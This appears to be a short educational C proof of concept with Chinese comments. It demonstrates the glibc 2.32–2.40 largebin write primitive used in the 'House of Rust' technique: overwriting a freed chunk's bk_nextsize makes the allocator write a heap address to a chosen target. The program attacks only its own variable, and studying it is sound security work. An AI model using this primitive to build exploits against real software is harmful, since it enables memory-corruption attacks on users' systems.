/*
 * House of Rust 使用的 2.30 之后版本的 largebin 写原语，适用于 glibc 2.32～2.40。
 *
 * 漏洞模型：可以修改已经进入 largebin 的 chunk->bk_nextsize。
 * 成功效果：把新插入 chunk 的头地址写入 target。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    size_t target = 0;

    /* p1 的物理大小是 0x430。 */
    size_t *p1 = malloc(0x428);

    /* 这个 fence 用来防止 p1 和后面的 p2 发生合并。 */
    malloc(0x18);

    /* p2 的物理大小是 0x420，比 p1 小 0x10，正好和 p1 落在同一个 largebin。 */
    size_t *p2 = malloc(0x418);

    /* 这个 fence 用来防止 p2 和 top chunk 合并。 */
    malloc(0x18);

    /* p1 先进入 unsorted bin。 */
    free(p1);

    /* 这次更大的申请会把 p1 从 unsorted bin 转移到 largebin 里。 */
    malloc(0x438);

    /* p2 留在 unsorted bin 里，等下会作为一个更小的节点插入 p1 所在的 largebin。 */
    free(p2);

    /*
     * p1[3] 就是 p1->bk_nextsize。
     * 插入 p2 的时候，会往 bk_nextsize->fd_nextsize 这个位置写入 p2 的 chunk 头地址。
     * fd_nextsize 位于伪造 chunk 头的 +0x20 处，所以这里要用 target-0x20。
     */
    p1[3] = (size_t)&target - 0x20;

    /* 再申请一次，让它重新扫描 unsorted bin，触发 p2 插入 largebin 的过程。 */
    malloc(0x438);

    assert(target == (size_t)(p2 - 2));
    printf("[+] largebin 写入目标\n");
    return 0;
}
